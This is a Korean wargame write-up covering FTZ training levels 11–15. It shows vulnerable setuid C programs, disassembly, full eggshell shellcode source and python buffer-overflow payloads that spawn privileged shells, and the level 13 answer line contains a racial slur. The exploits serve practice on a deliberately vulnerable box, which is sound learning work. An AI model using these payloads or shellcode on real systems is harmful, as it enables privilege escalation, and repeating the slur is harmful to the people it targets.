#================================================================================#
#FTZ Level 11
hint)
#include <stdio.h>
#include <stdlib.h>
 
int main( int argc, char *argv[] )
{
	char str[256];

 	setreuid( 3092, 3092 );
	strcpy( str, argv[1] );
	printf( str );
} 


#FTZ Level 11 풀이 과정)
find / -user level12 -perm -4000 2>/dev/null ->
/home/level11/attackme
홈디렉토리에 attackme 라는 녀석이 있는데, Setuid를 가지고 있다.
실행해보니 Segmentation fault라고 하며 끝.

일단 해당 소스코드를 직접 까보자.


0x08048394 <main+0>:	push   ebp
0x08048395 <main+1>:	mov    ebp,esp
0x08048397 <main+3>:	sub    esp,0x108
0x0804839d <main+9>:	and    esp,0xfffffff0
0x080483a0 <main+12>:	mov    eax,0x0
0x080483a5 <main+17>:	sub    esp,eax
0x080483a7 <main+19>:	sub    esp,0x8
0x080483aa <main+22>:	push   0xc14
0x080483af <main+27>:	push   0xc14
0x080483b4 <main+32>:	call   0x80482c4 <setreuid>
0x080483b9 <main+37>:	add    esp,0x10
0x080483bc <main+40>:	sub    esp,0x8
0x080483bf <main+43>:	mov    eax,DWORD PTR [ebp+12]
0x080483c2 <main+46>:	add    eax,0x4
0x080483c5 <main+49>:	push   DWORD PTR [eax]
0x080483c7 <main+51>:	lea    eax,[ebp-264]
0x080483cd <main+57>:	push   eax
0x080483ce <main+58>:	call   0x80482d4 <strcpy>
0x080483d3 <main+63>:	add    esp,0x10
0x080483d6 <main+66>:	sub    esp,0xc
0x080483d9 <main+69>:	lea    eax,[ebp-264]
0x080483df <main+75>:	push   eax
0x080483e0 <main+76>:	call   0x80482b4 <printf>
0x080483e5 <main+81>:	add    esp,0x10
0x080483e8 <main+84>:	leave  
0x080483e9 <main+85>:	ret    
0x080483ea <main+86>:	nop    
0x080483eb <main+87>:	nop    

264바이트를 스택의 공간에 만들어 주는 것을 볼 수 있다.
dummy 때문에 8바이트가 늘어났다.
그럼 A를 264번 반복해서 넣어주고, 그 이후에 EIP가 가르킬 주소를 넣어주면 되겠다.
근데 EIP가 가르켜서 실행시킬 주소를 알아내는게 어려운데 쉽게 해결하는 방법이
Eggshell이라는 소스였다.
EggShell이라는 소스를 가져와서 컴파일 시켜서 실행시키면 EGGShell이 실행되며 그 환경변수의 주소값을 주는데
Eggshell이라는 소스 코드를 보면 /bin/bash라는 소스코드가 적혀있다.
setreuid 파일 내에 있으니 쉘만 실행시켜주면 그 권한으로 쉘이 실행되겠다.

#include <stdlib.h>
#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90
char shellcode[] =
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"
"\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
"\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
"\x00\xc9\xc3\x90/bin/sh";
unsigned long get_esp(void) {
	__asm__("movl %esp,%eax");
}                   

int main(int argc, char *argv[]) {
	char *buff, *ptr, *egg;
	long *addr_ptr, addr;
	int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
	int i, eggsize=DEFAULT_EGG_SIZE;
	if(argc > 1) bsize = atoi(argv[1]);
	if(argc > 2) offset = atoi(argv[2]); 
	if(argc > 3) eggsize = atoi(argv[3]); 
	if(!(buff = malloc(bsize))) {   
		printf("Can't allocate memory.\n"); 
		exit(0);                                
	}                                                   
	if(!(egg = malloc(eggsize))) {      
		printf("Can't allocate memory.\n");         
		exit(0);                                            
	}                                                               
	addr = get_esp() - offset;          
	printf("Using address: 0x%x\n", addr);  
	ptr = buff;                                 
	addr_ptr = (long *) ptr;                        
	for(i = 0; i < bsize; i+=4)                         
		*(addr_ptr++) = addr;                                       
	ptr = egg;                                              
	for(i = 0; i < eggsize - strlen(shellcode) - 1; i++)        
		*(ptr++) = NOP;                                                     
	for(i = 0; i < strlen(shellcode); i++)                          
		*(ptr++) = shellcode[i];                                                
	buff[bsize - 1] = '\0';                                             
	egg[eggsize - 1] = '\0';
	memcpy(egg,"EGG=",4);
	putenv(egg);
	memcpy(buff,"RET=",4);
	putenv(buff);
	system("/bin/bash");
	return 0;
}

EGGSHELL 소스코드다.
EGGSHELL에서 나온 주소값을 리틀 엔디언 방식으로 작성해서 붙여 넣기 해주면 끝.

./attackme $(python -c 'print("A"*264+"\xb8\xf3\xff\bf"))

근데 쉘이 적용되질 않았다. 그이유가.
ebp가 ret전에 있었다. 4바이트를 추가해서

./attackme $(python -c 'print("A"*268+"\xb8\xf3\xff\bf"))
여전히 오류.
무슨 문제인가 했더니, 환경변수의 주소가 틀렸다.

#include <stdio.h>




이란 소스를 가져와서 에그 실행 후 실행시켜주면 eggshell의 주소값을 정확히 가져온다. (참고 자료 : https://blog.dork94.com/99?category=749219)

제대로 명령이 실행되지 않았던 이유 :
putenv의 특징은 다음과 같습니다.
환경 변수 목록 중에 변수값을 수정하거나 추가합니다.
그러나 수정된 변수값이나 새로 추가된 환경 변수값은
실행 중인 프로그램에서만 유효하며 외부적으로는 변경되지 않습니다.
즉, 프로그램의 실행 단위인 애플리케이션 내에서만 유효합니다.
그 이유는 바로 프로그램 실행시 CRT(C RunTime libray)가 환경변수 포인터 (envp)값을 관리하는 environ List로 복사를 하게 됩니다.
이때, envp를 바꿔도 CRT가 해당 포인터를 list로 복사해주지 않기 때문에 적용이 되지 않습니다.
따라서, putenv는 환경변수를 적용시키기 위해 환경변수 포인터를 이용하는 것이 아닌 environ List에 복사를 하게 되는 것이며 이 List는 프로그램 내에서만 유효하게 되는 것 입니다(CRT가 envp를 이용해 불러들인 저장된 값이 아니기 때문이죠. 환경변수를 추가하려면 export 명령어를 이용하며 envp를 추가 가능합니다).
때문에 environ List가 유효한 프로그램 내에서 eggshell을 실행 시킬 수 밖에 없는 것 이지요! 


my-pass로 답을 얻어오면 된다.

추후에 알게 된 사실인데, 어셈블리어를 분석해서 얼만큼의 공간이 있는 것보다.
문자열의 크기를 보고 대충 때려박은 다음에 +1씩 늘려가는 스크립트를 작성하는게 더 편하다고 하더라.
야매가 더 쉽고 정확하다고 한다.



답 == it is like this




#================================================================================#
#FTZ Level 12
hint)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
int main( void )
{
	char str[256];

 	setreuid( 3093, 3093 );
	printf( "문장을 입력하세요.\n" );
	gets( str );
	printf( "%s\n", str );
}  

#FTZ Level 12 풀이 과정)
방식이 비슷해보인다. EGGSHELL로 BOF를 하면 될 것 같다.
근데 다른 점이, 실행과 동시에 인자를 받아서 하는 것이 아닌 안에 문장을 넣어야 한다.
일단, 어셈으로 까보자. 직접 인자를 하나하나 넣어서 세그먼트 오류가 나는 것도 좋지만 아직은 어셈을 봐야
실력일 늘 것 같다.
(gdb) set disassembly-flavor intel
(gdb) disas main
intel 형식으로 바꾸고 진행했다.

Dump of assembler code for function main:
0x08048470 <main+0>:	push   ebp
0x08048471 <main+1>:	mov    ebp,esp
0x08048473 <main+3>:	sub    esp,0x108
0x08048479 <main+9>:	sub    esp,0x8
0x0804847c <main+12>:	push   0xc15
0x08048481 <main+17>:	push   0xc15
0x08048486 <main+22>:	call   0x804835c <setreuid>
0x0804848b <main+27>:	add    esp,0x10
0x0804848e <main+30>:	sub    esp,0xc
0x08048491 <main+33>:	push   0x8048538
0x08048496 <main+38>:	call   0x804834c <printf>
0x0804849b <main+43>:	add    esp,0x10
0x0804849e <main+46>:	sub    esp,0xc
0x080484a1 <main+49>:	lea    eax,[ebp-264]
0x080484a7 <main+55>:	push   eax
0x080484a8 <main+56>:	call   0x804831c <gets>
0x080484ad <main+61>:	add    esp,0x10
0x080484b0 <main+64>:	sub    esp,0x8
0x080484b3 <main+67>:	lea    eax,[ebp-264]
0x080484b9 <main+73>:	push   eax
0x080484ba <main+74>:	push   0x804854c
0x080484bf <main+79>:	call   0x804834c <printf>
0x080484c4 <main+84>:	add    esp,0x10
0x080484c7 <main+87>:	leave  
0x080484c8 <main+88>:	ret    
0x080484c9 <main+89>:	lea    esi,[esi]
0x080484cc <main+92>:	nop    
0x080484cd <main+93>:	nop    
0x080484ce <main+94>:	nop    
0x080484cf <main+95>:	nop    

0x08048473 <main+3>:	sub    esp,0x108 을보면
일단 스택에 264 바이트를 할당한다. 아마 256바이트와 char형 데이터에 8byte dummy를 추가했다.
그렇다면 스택에는 EBP까지 하여 총 268byte의 문자열을 입력하면(null포함 269byte가 되기에.) 오버플로우가 일어난다는 것을 추측 할 수 있다.
일단 에그쉘로 실행시켜야 하기에, 에그쉘 코드를 이용해서 환경변수의 주소를 얻어오자. (코드는 leve11 풀이에 있다.)
에그쉘의 제대로된 주소값도 얻어오는 코드도 컴파일 하자.
환경변수에 에그쉘(/bin/bash가 포함된) 코드를 넣고 주소를 얻었다.
Addr = 0xbffff2c5
이것을 268byte 문자열 뒤에 리틀 엔디언 방식으로 변환하여 코드로 넣어주면 되겠다.
/tmp/12에서 진행했기에 절대경로로 실행했다.
(python -c 'print"A"*268 + "\xc5\xf2\xff\xbf"'; cat)  | /home/level12/attackme
하면 문자열 오류가 보이면서 shell이 이상하게 작동될텐데 id를 쳐보니까 권한이 잘 얻어왔다.
my-pass로 하면 답이 나온다.


답 == have no clue








#================================================================================#
#FTZ Level 13
hint)
#include <stdlib.h> 

main(int argc, char *argv[])
{
   long i=0x1234567;
   char buf[1024];

   setreuid( 3094, 3094 );
   if(argc > 1)
   strcpy(buf,argv[1]);

   if(i != 0x1234567) {
   printf(" Warnning: Buffer Overflow !!! \n");
   kill(0,11);
   }
}


#FTZ Level 13 풀이 과정)
코드를 보면 i에 0x1234567을 넣고 그다음 char형 배열을 1024크기를 할당한다.
그리고 setreuid 함수 실행. 
일단 실행시킬때 인자가 하나 이상 들어와야 buf에 넣을테고, 인자가 페이로드로 들어가면 되겠다.
if에서 걸리는 것이 있다 i 변수의 값이 0x1234567이 아니면 버퍼오버플로우라고 막는 것이다.

일단 /tmp/13에 attackme를 복사해 gdb로 까봤다.

0x080484a0 <main+0>:	push   ebp
0x080484a1 <main+1>:	mov    ebp,esp
0x080484a3 <main+3>:	sub    esp,0x418
0x080484a9 <main+9>:	mov    DWORD PTR [ebp-12],0x1234567
0x080484b0 <main+16>:	sub    esp,0x8
0x080484b3 <main+19>:	push   0xc16
0x080484b8 <main+24>:	push   0xc16
0x080484bd <main+29>:	call   0x8048370 <setreuid>
0x080484c2 <main+34>:	add    esp,0x10
0x080484c5 <main+37>:	cmp    DWORD PTR [ebp+8],0x1
0x080484c9 <main+41>:	jle    0x80484e5 <main+69>
0x080484cb <main+43>:	sub    esp,0x8
0x080484ce <main+46>:	mov    eax,DWORD PTR [ebp+12]
0x080484d1 <main+49>:	add    eax,0x4
0x080484d4 <main+52>:	push   DWORD PTR [eax]
0x080484d6 <main+54>:	lea    eax,[ebp-1048]
0x080484dc <main+60>:	push   eax
0x080484dd <main+61>:	call   0x8048390 <strcpy>
0x080484e2 <main+66>:	add    esp,0x10
0x080484e5 <main+69>:	cmp    DWORD PTR [ebp-12],0x1234567
0x080484ec <main+76>:	je     0x804850d <main+109>
0x080484ee <main+78>:	sub    esp,0xc
0x080484f1 <main+81>:	push   0x80485a0
0x080484f6 <main+86>:	call   0x8048360 <printf>
0x080484fb <main+91>:	add    esp,0x10
0x080484fe <main+94>:	sub    esp,0x8
0x08048501 <main+97>:	push   0xb
0x08048503 <main+99>:	push   0x0
0x08048505 <main+101>:	call   0x8048380 <kill>
0x0804850a <main+106>:	add    esp,0x10
0x0804850d <main+109>:	leave  
0x0804850e <main+110>:	ret    
0x0804850f <main+111>:	nop  


스택에 1048의 크기를 할당하는 것을 볼 수 있다.
그 이후 [ebp-12]부분에 0x1234567을 넣는 것이 보인다.
buf의 위치를 찾고자 strcpy의 함수가 실행되기 전 push하는 곳을 찾으니
[ebp-1048]에 위치한다. 스택에서 i 변수 아래에 buf가 생성되었다.

i는 건들면 안되기에 bof 될때 i변수의 값은 유지한 채 ret에 도달해보자.
1048-12를 하면 1036에 i 부분이 있고 이 값이 바뀌면 오류가 뜰 것이다. 확인해보자.
작성한 페이로드는 이렇다.
./attackme $(python -c 'print "A"*1036') ->
Warnning: Buffer Overflow !!! 
Segmentation fault

이렇게 뜬다. 확실히 그 쪽에 위치한 것 같으니. 이제 그곳에 0x1234567의 값을 넣자. 리틀엔디언으로 넣어줘야한다.
작성한 페이로드는 이렇다.
./attackme $(python -c 'print "A"*1036+"\x67\x45\x23\x01"')
이렇게 작성하면 순조롭게 작성한다. 좋다. 그럼 이제 i부분은 그대로 유지한채 ret으로 가야겠다.
디버그용 payload
./attackme $(python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12') ->
Segmentation fault
세그먼트 오류가 뜬다. 그럼 여기다가 EGGSHELL 주소값을 넣어주면 실행된다!

작성한 페이로드
./attackme $(python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\xc5\xf2\xff\xbf"')

답 == what that nigga want?





#================================================================================#
#FTZ Level 14
hint)
레벨14 이후로는 mainsource의 문제를 그대로 가져왔습니다.
버퍼 오버플로우, 포맷스트링을 학습하는데는 이 문제들이
최고의 효과를 가져다줍니다.

#include <stdio.h>
#include <unistd.h>
 
main()
{ int crap;
  int check;
  char buf[20];
  fgets(buf,45,stdin);
  if (check==0xdeadbeef)
   {
     setreuid(3095,3095);
     system("/bin/sh");
   }
}  


#FTZ Level 14 풀이 과정)
포맷스크링을 공부하고 진행했다.
쉽게 말해서 %x나 %n %임의정수x 등 포맷과정에서 제대로된 포맷형식이 아니면 다음 address의 값을 바꿀 수 있다.
일단, attackme를 까보는게 좋다. 
/tmp/14에서 복사하여 진행했다.

Dump of assembler code for function main:
0x08048490 <main+0>:	push   ebp
0x08048491 <main+1>:	mov    ebp,esp
0x08048493 <main+3>:	sub    esp,0x38          // stack 56byte 공간 확장. int 변수 2개, char [20] , dummy 포함 56byte
0x08048496 <main+6>:	sub    esp,0x4
0x08048499 <main+9>:	push   ds:0x8049664		 //Data Segment : 0x8049664 위치에 있는 것을 stack에 저장.
0x0804849f <main+15>:	push   0x2d				 //45
0x080484a1 <main+17>:	lea    eax,[ebp-56] 	 //buf
0x080484a4 <main+20>:	push   eax
0x080484a5 <main+21>:	call   0x8048360 <fgets>
0x080484aa <main+26>:	add    esp,0x10
0x080484ad <main+29>:	cmp    DWORD PTR [ebp-16],0xdeadbeef // ebp-16 위치에 0xdeadbeef가 올수 있도록 입력하면 코드 실행.
0x080484b4 <main+36>:	jne    0x80484db <main+75>
0x080484b6 <main+38>:	sub    esp,0x8
0x080484b9 <main+41>:	push   0xc17
0x080484be <main+46>:	push   0xc17
0x080484c3 <main+51>:	call   0x8048380 <setreuid>
0x080484c8 <main+56>:	add    esp,0x10
0x080484cb <main+59>:	sub    esp,0xc
0x080484ce <main+62>:	push   0x8048548
0x080484d3 <main+67>:	call   0x8048340 <system>
0x080484d8 <main+72>:	add    esp,0x10
0x080484db <main+75>:	leave  
0x080484dc <main+76>:	ret    
0x080484dd <main+77>:	lea    esi,[esi]
End of assembler dump.
어셈블리어를 보면 ebp-16위치에 deadbeef가 오면 된다. 그럼 56-16은 40이니,
bof를 하려면 40바이트를 채워주고 deadbeef를 리틀엔디언 형식으로 넣어주면 자동으로 실행되도록 코딩이 되어있다.

(python -c 'print"A"*40 + "\xef\xbe\xad\xde"'; cat)  | /home/level14/attackme
하면 일단 쉘은 작동하고 비번은 얻어 낼 수 있다.


답 == guess what




#================================================================================#
#FTZ Level 15
hint)
#include <stdio.h>
 
main()
{ int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
}  

#FTZ Level 15 풀이 과정)
이번에는 check가 포인터로 변했다.
전과 같은 방식으로 도전하면 세그먼트 오류가 뜬다.

Dump of assembler code for function main:
0x08048490 <main+0>:	push   ebp
0x08048491 <main+1>:	mov    ebp,esp
0x08048493 <main+3>:	sub    esp,0x38
0x08048496 <main+6>:	sub    esp,0x4
0x08048499 <main+9>:	push   ds:0x8049664
0x0804849f <main+15>:	push   0x2d
0x080484a1 <main+17>:	lea    eax,[ebp-56]
0x080484a4 <main+20>:	push   eax
0x080484a5 <main+21>:	call   0x8048360 <fgets>
0x080484aa <main+26>:	add    esp,0x10
0x080484ad <main+29>:	mov    eax,DWORD PTR [ebp-16]
0x080484b0 <main+32>:	cmp    DWORD PTR [eax],0xdeadbeef 
0x080484b6 <main+38>:	jne    0x80484dd <main+77>
0x080484b8 <main+40>:	sub    esp,0x8
0x080484bb <main+43>:	push   0xc18
0x080484c0 <main+48>:	push   0xc18
0x080484c5 <main+53>:	call   0x8048380 <setreuid>
0x080484ca <main+58>:	add    esp,0x10
0x080484cd <main+61>:	sub    esp,0xc
0x080484d0 <main+64>:	push   0x8048548
0x080484d5 <main+69>:	call   0x8048340 <system>
0x080484da <main+74>:	add    esp,0x10
0x080484dd <main+77>:	leave  
0x080484de <main+78>:	ret    
0x080484df <main+79>:	nop    
End of assembler dump.

어셈블리어를 까보면, 여전히 40바이트 차이가 나는데, ebp-16의 포인터를 EAX에 복사해서 EAX의 포인터로 0xdeadbeef를 비교한다.
즉 EAX에 들어갈 주소가 0xdeadbeef의 주소가 된다면, 결국 같은 값이니 if문을 충분히 수행할 수 있다.

gdb 에서 x/[임의정수]x [주소] 하면 임의 정수 크기만큼 값을 볼 수 있는데.
gdb x/5/x 0x080484b2 를 하니 deadbeef가 보였다. 저것을 리틀엔디언 방식으로 페이로드에 넣어주면 되겠다. 


(python -c 'print"A"*40 + "\xb2\x84\x04\x08"'; cat)  | /home/level15/attackme

요상하게 쉘이 실행되고 my-pass하면 얻어올 수 있다.
포맷스트링을 사용 안하고 있다...?


답 == about to cause mass
